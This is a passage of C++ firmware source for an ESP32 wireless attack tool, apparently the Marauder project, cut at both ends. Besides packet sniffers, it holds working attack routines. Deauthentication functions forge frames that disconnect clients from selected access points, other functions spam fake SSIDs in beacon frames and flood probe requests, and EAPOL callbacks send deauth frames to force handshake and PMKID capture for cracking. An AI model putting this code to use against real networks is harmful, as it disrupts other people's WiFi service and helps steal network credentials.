				for (int i = 0; i < 40 - temp_len; i++)
				{
					display_string.concat(" ");
				}

				AccessPoint ap;
				ap.essid = essid;
				ap.channel = snifferPacket->rx_ctrl.channel;
				ap.bssid[0] = snifferPacket->payload[10];
				ap.bssid[1] = snifferPacket->payload[11];
				ap.bssid[2] = snifferPacket->payload[12];
				ap.bssid[3] = snifferPacket->payload[13];
				ap.bssid[4] = snifferPacket->payload[14];
				ap.bssid[5] = snifferPacket->payload[15];
				ap.selected = false;

				ap.beacon = new LinkedList<char>();
				ap.beacon->add(snifferPacket->payload[34]);
				ap.beacon->add(snifferPacket->payload[35]);

				ap.rssi = snifferPacket->rx_ctrl.rssi;

				foundAP(ap);

				access_points->add(ap);

				if (save_packet)
					sd_obj.addPacket(snifferPacket->payload, len);
			}
		}
	}
}

void WiFiScan::apSnifferCallback(void *buf, wifi_promiscuous_pkt_type_t type)
{
	bool save_packet = settings_obj.loadSetting<bool>("SavePCAP");

	wifi_promiscuous_pkt_t *snifferPacket = (wifi_promiscuous_pkt_t *)buf;
	WifiMgmtHdr *frameControl = (WifiMgmtHdr *)snifferPacket->payload;
	wifi_pkt_rx_ctrl_t ctrl = (wifi_pkt_rx_ctrl_t)snifferPacket->rx_ctrl;
	int len = snifferPacket->rx_ctrl.sig_len;

	String display_string = "";
	String essid = "";
	String bssid = "";

	if (type == WIFI_PKT_MGMT)
	{
		len -= 4;
		int fctl = ntohs(frameControl->fctl);
		const wifi_ieee80211_packet_t *ipkt = (wifi_ieee80211_packet_t *)snifferPacket->payload;
		const WifiMgmtHdr *hdr = &ipkt->hdr;

		int buf = 0;

		if ((snifferPacket->payload[0] == 0x80) && (buf == 0))
		{
			char addr[] = "00:00:00:00:00:00";
			getMAC(addr, snifferPacket->payload, 10);

			bool in_list = false;
			bool mac_match = true;

			for (int i = 0; i < access_points->size(); i++)
			{
				mac_match = true;

				for (int x = 0; x < 6; x++)
				{
					if (snifferPacket->payload[x + 10] != access_points->get(i).bssid[x])
					{
						mac_match = false;
						break;
					}
				}
				if (mac_match)
				{
					in_list = true;
					break;
				}
			}

			if (!in_list)
			{

				delay(random(0, 10));
				display_string.concat(addr);
				display_string.concat(" -> ");

				for (int i = 0; i < snifferPacket->payload[37]; i++)
				{
					display_string.concat((char)snifferPacket->payload[i + 38]);
					essid.concat((char)snifferPacket->payload[i + 38]);
				}

				bssid.concat(addr);

				int temp_len = display_string.length();
				for (int i = 0; i < 40 - temp_len; i++)
				{
					display_string.concat(" ");
				}

				AccessPoint ap = {essid,
								  snifferPacket->rx_ctrl.channel,
								  {snifferPacket->payload[10],
								   snifferPacket->payload[11],
								   snifferPacket->payload[12],
								   snifferPacket->payload[13],
								   snifferPacket->payload[14],
								   snifferPacket->payload[15]},
								  false,
								  NULL,
								  snifferPacket->rx_ctrl.rssi};

				foundSniffAP(ap);

				access_points->add(ap);

				if (save_packet)
					sd_obj.addPacket(snifferPacket->payload, len);
			}
		}
	}
}

void WiFiScan::beaconSnifferCallback(void *buf, wifi_promiscuous_pkt_type_t type)
{
	bool save_packet = settings_obj.loadSetting<bool>("SavePCAP");

	wifi_promiscuous_pkt_t *snifferPacket = (wifi_promiscuous_pkt_t *)buf;
	WifiMgmtHdr *frameControl = (WifiMgmtHdr *)snifferPacket->payload;
	wifi_pkt_rx_ctrl_t ctrl = (wifi_pkt_rx_ctrl_t)snifferPacket->rx_ctrl;
	int len = snifferPacket->rx_ctrl.sig_len;

	String display_string = "";

	if (type == WIFI_PKT_MGMT)
	{
		len -= 4;
		int fctl = ntohs(frameControl->fctl);
		const wifi_ieee80211_packet_t *ipkt = (wifi_ieee80211_packet_t *)snifferPacket->payload;
		const WifiMgmtHdr *hdr = &ipkt->hdr;
		int buf = 0;

		if ((snifferPacket->payload[0] == 0x80) && (buf == 0))
		{
			delay(random(0, 10));
			Serial.print("RSSI: ");
			Serial.print(snifferPacket->rx_ctrl.rssi);
			Serial.print(" Ch: ");
			Serial.print(snifferPacket->rx_ctrl.channel);
			Serial.print(" BSSID: ");
			char addr[] = "00:00:00:00:00:00";
			getMAC(addr, snifferPacket->payload, 10);
			Serial.print(addr);
			display_string.concat(addr);
			Serial.print(" ESSID: ");
			display_string.concat(" -> ");
			for (int i = 0; i < snifferPacket->payload[37]; i++)
			{
				Serial.print((char)snifferPacket->payload[i + 38]);
				display_string.concat((char)snifferPacket->payload[i + 38]);
			}

			int temp_len = display_string.length();
			Serial.println();

			if (save_packet)
				sd_obj.addPacket(snifferPacket->payload, len);
		}
	}
}

void WiFiScan::deauthSnifferCallback(void *buf, wifi_promiscuous_pkt_type_t type)
{
	bool save_packet = settings_obj.loadSetting<bool>("SavePCAP");

	wifi_promiscuous_pkt_t *snifferPacket = (wifi_promiscuous_pkt_t *)buf;
	WifiMgmtHdr *frameControl = (WifiMgmtHdr *)snifferPacket->payload;
	wifi_pkt_rx_ctrl_t ctrl = (wifi_pkt_rx_ctrl_t)snifferPacket->rx_ctrl;
	int len = snifferPacket->rx_ctrl.sig_len;

	String display_string = "";

	if (type == WIFI_PKT_MGMT)
	{
		len -= 4;
		int fctl = ntohs(frameControl->fctl);
		const wifi_ieee80211_packet_t *ipkt = (wifi_ieee80211_packet_t *)snifferPacket->payload;
		const WifiMgmtHdr *hdr = &ipkt->hdr;
		int buf = 0;

		if ((snifferPacket->payload[0] == 0xA0 || snifferPacket->payload[0] == 0xC0) && (buf == 0))
		{
			delay(random(0, 10));
			Serial.print("RSSI: ");
			Serial.print(snifferPacket->rx_ctrl.rssi);
			Serial.print(" Ch: ");
			Serial.print(snifferPacket->rx_ctrl.channel);
			Serial.print(" BSSID: ");
			char addr[] = "00:00:00:00:00:00";
			getMAC(addr, snifferPacket->payload, 10);
			Serial.print(addr);
			display_string.concat(" RSSI: ");
			display_string.concat(snifferPacket->rx_ctrl.rssi);

			display_string.concat(" ");
			display_string.concat(addr);

			Serial.println();

			if (save_packet)
				sd_obj.addPacket(snifferPacket->payload, len);
		}
	}
}

void WiFiScan::probeSnifferCallback(void *buf, wifi_promiscuous_pkt_type_t type)
{
	bool save_packet = settings_obj.loadSetting<bool>("SavePCAP");

	wifi_promiscuous_pkt_t *snifferPacket = (wifi_promiscuous_pkt_t *)buf;
	WifiMgmtHdr *frameControl = (WifiMgmtHdr *)snifferPacket->payload;
	wifi_pkt_rx_ctrl_t ctrl = (wifi_pkt_rx_ctrl_t)snifferPacket->rx_ctrl;
	int len = snifferPacket->rx_ctrl.sig_len;

	String display_string = "";

	if (type == WIFI_PKT_MGMT)
	{
		len -= 4;
		int fctl = ntohs(frameControl->fctl);
		const wifi_ieee80211_packet_t *ipkt = (wifi_ieee80211_packet_t *)snifferPacket->payload;
		const WifiMgmtHdr *hdr = &ipkt->hdr;
		int buf = 0;

		if ((snifferPacket->payload[0] == 0x40) && (buf == 0))
		{
			delay(random(0, 10));
			Serial.print("RSSI: ");
			Serial.print(snifferPacket->rx_ctrl.rssi);
			Serial.print(" Ch: ");
			Serial.print(snifferPacket->rx_ctrl.channel);
			Serial.print(" Client: ");
			char addr[] = "00:00:00:00:00:00";
			getMAC(addr, snifferPacket->payload, 10);
			Serial.print(addr);
			display_string.concat(addr);
			Serial.print(" Requesting: ");
			display_string.concat(" -> ");
			for (int i = 0; i < snifferPacket->payload[25]; i++)
			{
				Serial.print((char)snifferPacket->payload[26 + i]);
				display_string.concat((char)snifferPacket->payload[26 + i]);
			}

			Serial.println();

			if (save_packet)
				sd_obj.addPacket(snifferPacket->payload, len);
		}
	}
}

void WiFiScan::beaconListSnifferCallback(void *buf, wifi_promiscuous_pkt_type_t type)
{
	bool save_packet = settings_obj.loadSetting<bool>("SavePCAP");

	wifi_promiscuous_pkt_t *snifferPacket = (wifi_promiscuous_pkt_t *)buf;
	WifiMgmtHdr *frameControl = (WifiMgmtHdr *)snifferPacket->payload;
	wifi_pkt_rx_ctrl_t ctrl = (wifi_pkt_rx_ctrl_t)snifferPacket->rx_ctrl;
	int len = snifferPacket->rx_ctrl.sig_len;

	String display_string = "";
	String essid = "";
	bool found = false;

	if (type == WIFI_PKT_MGMT)
	{
		len -= 4;
		int fctl = ntohs(frameControl->fctl);
		const wifi_ieee80211_packet_t *ipkt = (wifi_ieee80211_packet_t *)snifferPacket->payload;
		const WifiMgmtHdr *hdr = &ipkt->hdr;
		int buf = 0;

		if ((snifferPacket->payload[0] == 0x40) && (buf == 0))
		{

			for (uint8_t i = 0; i < snifferPacket->payload[25]; i++)
			{
				essid.concat((char)snifferPacket->payload[26 + i]);
			}

			for (int i = 0; i < ssids->size(); i++)
			{
				if (ssids->get(i).essid == essid)
				{
					Serial.println("Found a sheep");
					found = true;
					break;
				}
			}

			if (!found)
				return;

			delay(random(0, 10));
			Serial.print("RSSI: ");
			Serial.print(snifferPacket->rx_ctrl.rssi);
			Serial.print(" Ch: ");
			Serial.print(snifferPacket->rx_ctrl.channel);
			Serial.print(" Client: ");
			char addr[] = "00:00:00:00:00:00";
			getMAC(addr, snifferPacket->payload, 10);
			Serial.print(addr);
			display_string.concat(addr);
			Serial.print(" Requesting: ");
			display_string.concat(" -> ");

			// ESSID
			for (int i = 0; i < snifferPacket->payload[25]; i++)
			{
				Serial.print((char)snifferPacket->payload[26 + i]);
				display_string.concat((char)snifferPacket->payload[26 + i]);
			}

			Serial.println();

			if (save_packet)
				sd_obj.addPacket(snifferPacket->payload, len);
		}
	}
}

/*
void WiFiScan::broadcastAPBeacon(uint32_t currentTime, AccessPoint custom_ssid) {
  set_channel = random(1,12);
  esp_wifi_set_channel(set_channel, WIFI_SECOND_CHAN_NONE);
  delay(1);

  // Randomize SRC MAC
  packet[10] = packet[16] = custom_ssid.bssid[0];
  packet[11] = packet[17] = custom_ssid.bssid[1];
  packet[12] = packet[18] = custom_ssid.bssid[2];
  packet[13] = packet[19] = custom_ssid.bssid[3];
  packet[14] = packet[20] = custom_ssid.bssid[4];
  packet[15] = packet[21] = custom_ssid.bssid[5];

  char ESSID[custom_ssid.essid.length() + 1] = {};
  custom_ssid.essid.toCharArray(ESSID, custom_ssid.essid.length() + 1);
}*/

void WiFiScan::broadcastCustomBeacon(uint32_t current_time, AccessPoint custom_ssid)
{
	set_channel = random(1, 12);
	esp_wifi_set_channel(set_channel, WIFI_SECOND_CHAN_NONE);
	delay(1);

	if (custom_ssid.beacon->size() == 0)
		return;

	// Randomize SRC MAC
	// Randomize SRC MAC
	packet[10] = packet[16] = random(256);
	packet[11] = packet[17] = random(256);
	packet[12] = packet[18] = random(256);
	packet[13] = packet[19] = random(256);
	packet[14] = packet[20] = random(256);
	packet[15] = packet[21] = random(256);

	char ESSID[custom_ssid.essid.length() + 1] = {};
	custom_ssid.essid.toCharArray(ESSID, custom_ssid.essid.length() + 1);

	int realLen = strlen(ESSID);
	int ssidLen = random(realLen, 33);
	int numSpace = ssidLen - realLen;
	// int rand_len = sizeof(rand_reg);
	int fullLen = ssidLen;
	packet[37] = fullLen;

	// Insert my tag
	for (int i = 0; i < realLen; i++)
		packet[38 + i] = ESSID[i];

	for (int i = 0; i < numSpace; i++)
		packet[38 + realLen + i] = 0x20;

	/////////////////////////////

	packet[50 + fullLen] = set_channel;

	uint8_t postSSID[13] = {0x01, 0x08, 0x82, 0x84, 0x8b, 0x96, 0x24, 0x30, 0x48, 0x6c, // supported rate
							0x03, 0x01, 0x04 /*DSSS (Current Channel)*/};

	// Add everything that goes after the SSID
	// for(int i = 0; i < 12; i++)
	//  packet[38 + fullLen + i] = postSSID[i];

	packet[34] = custom_ssid.beacon->get(0);
	packet[35] = custom_ssid.beacon->get(1);

	esp_wifi_80211_tx(WIFI_IF_AP, packet, sizeof(packet), false);
	esp_wifi_80211_tx(WIFI_IF_AP, packet, sizeof(packet), false);
	esp_wifi_80211_tx(WIFI_IF_AP, packet, sizeof(packet), false);

	packets_sent = packets_sent + 3;
}

void WiFiScan::broadcastCustomBeacon(uint32_t current_time, ssid custom_ssid)
{
	set_channel = random(1, 12);
	esp_wifi_set_channel(set_channel, WIFI_SECOND_CHAN_NONE);
	delay(1);

	// Randomize SRC MAC
	packet[10] = packet[16] = custom_ssid.bssid[0];
	packet[11] = packet[17] = custom_ssid.bssid[1];
	packet[12] = packet[18] = custom_ssid.bssid[2];
	packet[13] = packet[19] = custom_ssid.bssid[3];
	packet[14] = packet[20] = custom_ssid.bssid[4];
	packet[15] = packet[21] = custom_ssid.bssid[5];

	char ESSID[custom_ssid.essid.length() + 1] = {};
	custom_ssid.essid.toCharArray(ESSID, custom_ssid.essid.length() + 1);

	int ssidLen = strlen(ESSID);
	// int rand_len = sizeof(rand_reg);
	int fullLen = ssidLen;
	packet[37] = fullLen;

	// Insert my tag
	for (int i = 0; i < ssidLen; i++)
		packet[38 + i] = ESSID[i];

	/////////////////////////////

	packet[50 + fullLen] = set_channel;

	uint8_t postSSID[13] = {0x01, 0x08, 0x82, 0x84, 0x8b, 0x96, 0x24, 0x30, 0x48, 0x6c, // supported rate
							0x03, 0x01, 0x04 /*DSSS (Current Channel)*/};

	// Add everything that goes after the SSID
	for (int i = 0; i < 12; i++)
		packet[38 + fullLen + i] = postSSID[i];

	esp_wifi_80211_tx(WIFI_IF_AP, packet, sizeof(packet), false);
	esp_wifi_80211_tx(WIFI_IF_AP, packet, sizeof(packet), false);
	esp_wifi_80211_tx(WIFI_IF_AP, packet, sizeof(packet), false);

	packets_sent = packets_sent + 3;
}

// Function to send beacons with random ESSID length
void WiFiScan::broadcastSetSSID(uint32_t current_time, char *ESSID)
{
	set_channel = random(1, 12);
	esp_wifi_set_channel(set_channel, WIFI_SECOND_CHAN_NONE);
	delay(1);

	// Randomize SRC MAC
	packet[10] = packet[16] = random(256);
	packet[11] = packet[17] = random(256);
	packet[12] = packet[18] = random(256);
	packet[13] = packet[19] = random(256);
	packet[14] = packet[20] = random(256);
	packet[15] = packet[21] = random(256);

	int ssidLen = strlen(ESSID);
	// int rand_len = sizeof(rand_reg);
	int fullLen = ssidLen;
	packet[37] = fullLen;

	// Insert my tag
	for (int i = 0; i < ssidLen; i++)
		packet[38 + i] = ESSID[i];

	/////////////////////////////

	packet[50 + fullLen] = set_channel;

	uint8_t postSSID[13] = {0x01, 0x08, 0x82, 0x84, 0x8b, 0x96, 0x24, 0x30, 0x48, 0x6c, // supported rate
							0x03, 0x01, 0x04 /*DSSS (Current Channel)*/};

	// Add everything that goes after the SSID
	for (int i = 0; i < 12; i++)
		packet[38 + fullLen + i] = postSSID[i];

	esp_wifi_80211_tx(WIFI_IF_AP, packet, sizeof(packet), false);
	esp_wifi_80211_tx(WIFI_IF_AP, packet, sizeof(packet), false);
	esp_wifi_80211_tx(WIFI_IF_AP, packet, sizeof(packet), false);

	packets_sent = packets_sent + 3;
}

// Function for sending crafted beacon frames
void WiFiScan::broadcastRandomSSID(uint32_t currentTime)
{

	set_channel = random(1, 12);
	esp_wifi_set_channel(set_channel, WIFI_SECOND_CHAN_NONE);
	delay(1);

	// Randomize SRC MAC
	packet[10] = packet[16] = random(256);
	packet[11] = packet[17] = random(256);
	packet[12] = packet[18] = random(256);
	packet[13] = packet[19] = random(256);
	packet[14] = packet[20] = random(256);
	packet[15] = packet[21] = random(256);

	packet[37] = 6;

	// Randomize SSID (Fixed size 6. Lazy right?)
	packet[38] = alfa[random(65)];
	packet[39] = alfa[random(65)];
	packet[40] = alfa[random(65)];
	packet[41] = alfa[random(65)];
	packet[42] = alfa[random(65)];
	packet[43] = alfa[random(65)];

	packet[56] = set_channel;

	uint8_t postSSID[13] = {0x01, 0x08, 0x82, 0x84, 0x8b, 0x96, 0x24, 0x30, 0x48, 0x6c, // supported rate
							0x03, 0x01, 0x04 /*DSSS (Current Channel)*/};

	// Add everything that goes after the SSID
	for (int i = 0; i < 12; i++)
		packet[38 + 6 + i] = postSSID[i];

	esp_wifi_80211_tx(WIFI_IF_AP, packet, sizeof(packet), false);
	// ESP_ERROR_CHECK(esp_wifi_80211_tx(WIFI_IF_AP, packet, sizeof(packet), false));
	// ESP_ERROR_CHECK(esp_wifi_80211_tx(WIFI_IF_AP, packet, sizeof(packet), false));

	packets_sent = packets_sent + 3;
}

// Function to send probe flood to all "active" access points
void WiFiScan::sendProbeAttack(uint32_t currentTime)
{
	// Itterate through all access points in list
	for (int i = 0; i < access_points->size(); i++)
	{

		// Check if active
		if (access_points->get(i).selected)
		{
			this->set_channel = access_points->get(i).channel;
			esp_wifi_set_channel(this->set_channel, WIFI_SECOND_CHAN_NONE);
			delay(1);

			// Build packet
			// Randomize SRC MAC

			prob_req_packet[10] = random(256);
			prob_req_packet[11] = random(256);
			prob_req_packet[12] = random(256);
			prob_req_packet[13] = random(256);
			prob_req_packet[14] = random(256);
			prob_req_packet[15] = random(256);

			// Set SSID length
			int ssidLen = access_points->get(i).essid.length();
			// int rand_len = sizeof(rand_reg);
			int fullLen = ssidLen;
			prob_req_packet[25] = fullLen;

			// Insert ESSID
			char buf[access_points->get(i).essid.length() + 1] = {};
			access_points->get(i).essid.toCharArray(buf, access_points->get(i).essid.length() + 1);

			for (int i = 0; i < ssidLen; i++)
				prob_req_packet[26 + i] = buf[i];

			/*
			 * 0x01, 0x08, 0x8c, 0x12, 0x18, 0x24,
										0x30, 0x48, 0x60, 0x6c, 0x2d, 0x1a,
										0xad, 0x01, 0x17, 0xff, 0xff, 0x00,
										0x00, 0x7e, 0x00, 0x00, 0x00, 0x00,
										0x00, 0x00, 0x00, 0x01, 0x00, 0x00,
										0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
										0x00, 0x00
			 */

			uint8_t postSSID[40] = {0x00, 0x00, 0x01, 0x08, 0x8c, 0x12,
									0x18, 0x24, 0x30, 0x48, 0x60, 0x6c,
									0x2d, 0x1a, 0xad, 0x01, 0x17, 0xff,
									0xff, 0x00, 0x00, 0x7e, 0x00, 0x00,
									0x00, 0x00, 0x00, 0x00, 0x00, 0x01,
									0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
									0x00, 0x00, 0x00, 0x00};

			uint8_t good_probe_req_packet[26 + fullLen + 40] = {};

			for (int i = 0; i < 26 + fullLen; i++)
				good_probe_req_packet[i] = prob_req_packet[i];

			for (int i = 0; i < 40; i++)
				good_probe_req_packet[26 + fullLen + i] = postSSID[i];

			// Send packet
			esp_wifi_80211_tx(WIFI_IF_AP, good_probe_req_packet, sizeof(good_probe_req_packet), false);
			esp_wifi_80211_tx(WIFI_IF_AP, good_probe_req_packet, sizeof(good_probe_req_packet), false);
			esp_wifi_80211_tx(WIFI_IF_AP, good_probe_req_packet, sizeof(good_probe_req_packet), false);

			packets_sent = packets_sent + 3;
		}
	}
}

void WiFiScan::sendDeauthFrame(uint8_t bssid[6], int channel)
{
	// Itterate through all access points in list
	// Check if active
	WiFiScan::set_channel = channel;
	esp_wifi_set_channel(channel, WIFI_SECOND_CHAN_NONE);
	delay(1);

	// Build packet

	deauth_frame_default[10] = bssid[0];
	deauth_frame_default[11] = bssid[1];
	deauth_frame_default[12] = bssid[2];
	deauth_frame_default[13] = bssid[3];
	deauth_frame_default[14] = bssid[4];
	deauth_frame_default[15] = bssid[5];

	deauth_frame_default[16] = bssid[0];
	deauth_frame_default[17] = bssid[1];
	deauth_frame_default[18] = bssid[2];
	deauth_frame_default[19] = bssid[3];
	deauth_frame_default[20] = bssid[4];
	deauth_frame_default[21] = bssid[5];

	// Send packet
	esp_wifi_80211_tx(WIFI_IF_AP, deauth_frame_default, sizeof(deauth_frame_default), false);
	esp_wifi_80211_tx(WIFI_IF_AP, deauth_frame_default, sizeof(deauth_frame_default), false);
	esp_wifi_80211_tx(WIFI_IF_AP, deauth_frame_default, sizeof(deauth_frame_default), false);

	packets_sent = packets_sent + 3;
}

void WiFiScan::sendDeauthAttack(uint32_t currentTime)
{
	// Itterate through all access points in list
	for (int i = 0; i < access_points->size(); i++)
	{

		// Check if active
		if (access_points->get(i).selected)
		{
			this->set_channel = access_points->get(i).channel;
			esp_wifi_set_channel(this->set_channel, WIFI_SECOND_CHAN_NONE);
			delay(1);

			// Build packet

			deauth_frame_default[10] = access_points->get(i).bssid[0];
			deauth_frame_default[11] = access_points->get(i).bssid[1];
			deauth_frame_default[12] = access_points->get(i).bssid[2];
			deauth_frame_default[13] = access_points->get(i).bssid[3];
			deauth_frame_default[14] = access_points->get(i).bssid[4];
			deauth_frame_default[15] = access_points->get(i).bssid[5];

			deauth_frame_default[16] = access_points->get(i).bssid[0];
			deauth_frame_default[17] = access_points->get(i).bssid[1];
			deauth_frame_default[18] = access_points->get(i).bssid[2];
			deauth_frame_default[19] = access_points->get(i).bssid[3];
			deauth_frame_default[20] = access_points->get(i).bssid[4];
			deauth_frame_default[21] = access_points->get(i).bssid[5];

			// Send packet
			esp_wifi_80211_tx(WIFI_IF_AP, deauth_frame_default, sizeof(deauth_frame_default), false);
			esp_wifi_80211_tx(WIFI_IF_AP, deauth_frame_default, sizeof(deauth_frame_default), false);
			esp_wifi_80211_tx(WIFI_IF_AP, deauth_frame_default, sizeof(deauth_frame_default), false);

			packets_sent = packets_sent + 3;
		}
	}
}

void WiFiScan::wifiSnifferCallback(void *buf, wifi_promiscuous_pkt_type_t type)
{
	bool save_packet = settings_obj.loadSetting<bool>("SavePCAP");

	wifi_promiscuous_pkt_t *snifferPacket = (wifi_promiscuous_pkt_t *)buf;
	WifiMgmtHdr *frameControl = (WifiMgmtHdr *)snifferPacket->payload;
	wifi_pkt_rx_ctrl_t ctrl = (wifi_pkt_rx_ctrl_t)snifferPacket->rx_ctrl;
	int len = snifferPacket->rx_ctrl.sig_len;

	String display_string = "";
	int buff = 0;

	if (type == WIFI_PKT_MGMT)
	{
		len -= 4;
		int fctl = ntohs(frameControl->fctl);
		const wifi_ieee80211_packet_t *ipkt = (wifi_ieee80211_packet_t *)snifferPacket->payload;
		const WifiMgmtHdr *hdr = &ipkt->hdr;

// If we dont the buffer size is not 0, don't write or else we get CORRUPT_HEAP
#ifndef MARAUDER_MINI
		if (snifferPacket->payload[0] == 0x80)
		{
			num_beacon++;
		}
		else if ((snifferPacket->payload[0] == 0xA0 || snifferPacket->payload[0] == 0xC0))
		{
			num_deauth++;
		}
		else if (snifferPacket->payload[0] == 0x40)
		{
			num_probe++;
		}
#endif

		char addr[] = "00:00:00:00:00:00";
		getMAC(addr, snifferPacket->payload, 10);
		display_string.concat(addr);

		int temp_len = display_string.length();

		if (save_packet)
			sd_obj.addPacket(snifferPacket->payload, len);
	}
}

void WiFiScan::eapolSnifferCallback(void *buf, wifi_promiscuous_pkt_type_t type)
{
	bool save_packet = settings_obj.loadSetting<bool>("SavePCAP");
	bool send_deauth = settings_obj.loadSetting<bool>("ForcePMKID");

	wifi_promiscuous_pkt_t *snifferPacket = (wifi_promiscuous_pkt_t *)buf;
	WifiMgmtHdr *frameControl = (WifiMgmtHdr *)snifferPacket->payload;
	wifi_pkt_rx_ctrl_t ctrl = (wifi_pkt_rx_ctrl_t)snifferPacket->rx_ctrl;
	int len = snifferPacket->rx_ctrl.sig_len;

	String display_string = "";

	if (type == WIFI_PKT_MGMT)
	{
		len -= 4;
		int fctl = ntohs(frameControl->fctl);
		const wifi_ieee80211_packet_t *ipkt = (wifi_ieee80211_packet_t *)snifferPacket->payload;
		const WifiMgmtHdr *hdr = &ipkt->hdr;
	}

	int buff = 0;

	// Found beacon frame. Decide whether to deauth
	if (send_deauth)
	{
		if (snifferPacket->payload[0] == 0x80)
		{
			// Build packet

			uint8_t new_packet[26] = {
				0xc0, 0x00, 0x3a, 0x01,
				0xff, 0xff, 0xff, 0xff, 0xff, 0xff,
				0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
				0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
				0xf0, 0xff, 0x02, 0x00};

			new_packet[10] = snifferPacket->payload[10];
			new_packet[11] = snifferPacket->payload[11];
			new_packet[12] = snifferPacket->payload[12];
			new_packet[13] = snifferPacket->payload[13];
			new_packet[14] = snifferPacket->payload[14];
			new_packet[15] = snifferPacket->payload[15];

			new_packet[16] = snifferPacket->payload[10];
			new_packet[17] = snifferPacket->payload[11];
			new_packet[18] = snifferPacket->payload[12];
			new_packet[19] = snifferPacket->payload[13];
			new_packet[20] = snifferPacket->payload[14];
			new_packet[21] = snifferPacket->payload[15];

			// Send packet
			// esp_wifi_80211_tx(WIFI_IF_AP, new_packet, sizeof(new_packet), false);
			// esp_wifi_80211_tx(WIFI_IF_AP, new_packet, sizeof(new_packet), false);
			esp_wifi_80211_tx(WIFI_IF_AP, new_packet, sizeof(new_packet), false);
			delay(1);
		}
	}

	if (((snifferPacket->payload[30] == 0x88 && snifferPacket->payload[31] == 0x8e) || (snifferPacket->payload[32] == 0x88 && snifferPacket->payload[33] == 0x8e)))
	{
		num_eapol++;
		Serial.println("Received EAPOL:");

		char addr[] = "00:00:00:00:00:00";
		getMAC(addr, snifferPacket->payload, 10);
		display_string.concat(addr);

		int temp_len = display_string.length();
	}

	if (save_packet)
		sd_obj.addPacket(snifferPacket->payload, len);
}

void WiFiScan::activeEapolSnifferCallback(void *buf, wifi_promiscuous_pkt_type_t type)
{
	bool save_packet = settings_obj.loadSetting<bool>("SavePCAP");
	bool send_deauth = settings_obj.loadSetting<bool>("ForcePMKID");

	wifi_promiscuous_pkt_t *snifferPacket = (wifi_promiscuous_pkt_t *)buf;
	WifiMgmtHdr *frameControl = (WifiMgmtHdr *)snifferPacket->payload;
	wifi_pkt_rx_ctrl_t ctrl = (wifi_pkt_rx_ctrl_t)snifferPacket->rx_ctrl;
	int len = snifferPacket->rx_ctrl.sig_len;

	if (type == WIFI_PKT_MGMT)
	{
		len -= 4;
		int fctl = ntohs(frameControl->fctl);
		const wifi_ieee80211_packet_t *ipkt = (wifi_ieee80211_packet_t *)snifferPacket->payload;
		const WifiMgmtHdr *hdr = &ipkt->hdr;
	}

	// Found beacon frame. Decide whether to deauth

	if (snifferPacket->payload[0] == 0x80)
	{
		// Build packet

		// Serial.println("Recieved beacon frame");

		uint8_t new_packet[26] = {
			0xc0, 0x00, 0x3a, 0x01,
			0xff, 0xff, 0xff, 0xff, 0xff, 0xff,
			0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
			0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
			0xf0, 0xff, 0x02, 0x00};

		new_packet[10] = snifferPacket->payload[10];
		new_packet[11] = snifferPacket->payload[11];
		new_packet[12] = snifferPacket->payload[12];
		new_packet[13] = snifferPacket->payload[13];
		new_packet[14] = snifferPacket->payload[14];
		new_packet[15] = snifferPacket->payload[15];

		new_packet[16] = snifferPacket->payload[10];
		new_packet[17] = snifferPacket->payload[11];
		new_packet[18] = snifferPacket->payload[12];
		new_packet[19] = snifferPacket->payload[13];
		new_packet[20] = snifferPacket->payload[14];
		new_packet[21] = snifferPacket->payload[15];

		// Send packet
		// esp_wifi_80211_tx(WIFI_IF_AP, new_packet, sizeof(new_packet), false);
		// esp_wifi_80211_tx(WIFI_IF_AP, new_packet, sizeof(new_packet), false);
		esp_wifi_80211_tx(WIFI_IF_AP, new_packet, sizeof(new_packet), false);
		delay(1);
	}

	if (((snifferPacket->payload[30] == 0x88 && snifferPacket->payload[31] == 0x8e) || (snifferPacket->payload[32] == 0x88 && snifferPacket->payload[33] == 0x8e)))
	{
		num_eapol++;
		Serial.println("Received EAPOL:");
	}

	if (save_packet)
		sd_obj.addPacket(snifferPacket->payload, len);
}

void WiFiScan::changeChannel(int chan)
{
	this->set_channel = chan;
	esp_wifi_set_channel(this->set_channel, WIFI_SECOND_CHAN_NONE);
	delay(1);
}

void WiFiScan::changeChannel()
{
	esp_wifi_set_channel(this->set_channel, WIFI_SECOND_CHAN_NONE);
	delay(1);
}

// Function to cycle to the next channel
void WiFiScan::channelHop()
{
	this->set_channel = this->set_channel + 1;
	if (this->set_channel > 13)
	{
		this->set_channel = 1;
	}
	esp_wifi_set_channel(this->set_channel, WIFI_SECOND_CHAN_NONE);
	delay(1);
}

char *WiFiScan::stringToChar(String string)
{
	char buf[string.length() + 1] = {};
	string.toCharArray(buf, string.length() + 1);

	return buf;
}

// Function for updating scan status
void WiFiScan::main(uint32_t currentTime)
{
	// WiFi operations
	if ((currentScanMode == WIFI_SCAN_PROBE) ||
		(currentScanMode == WIFI_SCAN_AP) ||
		(currentScanMode == WIFI_SCAN_TARGET_AP) ||
		(currentScanMode == WIFI_SCAN_PWN) ||
		(currentScanMode == WIFI_SCAN_ESPRESSIF) ||
		(currentScanMode == WIFI_SCAN_DEAUTH) ||
		(currentScanMode == WIFI_SCAN_ALL))
	{
		if (currentTime - initTime >= this->channel_hop_delay * 1000)
		{
			initTime = millis();
			channelHop();
		}
	}
	else if (currentScanMode == WIFI_PACKET_MONITOR)
	{
#ifndef MARAUDER_MINI
		// packetMonitorMain(currentTime);
#endif
	}
	else if (currentScanMode == WIFI_SCAN_EAPOL)
	{
#ifndef MARAUDER_MINI
		// eapolMonitorMain(currentTime);
#endif
	}
	else if (currentScanMode == WIFI_SCAN_ACTIVE_EAPOL)
	{
		// eapolMonitorMain(currentTime);
	}
	else if (currentScanMode == WIFI_ATTACK_AUTH)
	{
		for (int i = 0; i < 55; i++)
			this->sendProbeAttack(currentTime);

		if (currentTime - initTime >= 1000)
		{
			initTime = millis();
			String displayString = "";
			String displayString2 = "";
			displayString.concat("packets/sec: ");
			displayString.concat(packets_sent);
			for (int x = 0; x < STANDARD_FONT_CHAR_LIMIT; x++)
				displayString2.concat(" ");

			packets_sent = 0;
		}
	}
	else if (currentScanMode == WIFI_ATTACK_DEAUTH)
	{
		for (int i = 0; i < 55; i++)
			this->sendDeauthAttack(currentTime);

		if (currentTime - initTime >= 1000)
		{
			initTime = millis();
			String displayString = "";
			String displayString2 = "";
			displayString.concat("packets/sec: ");
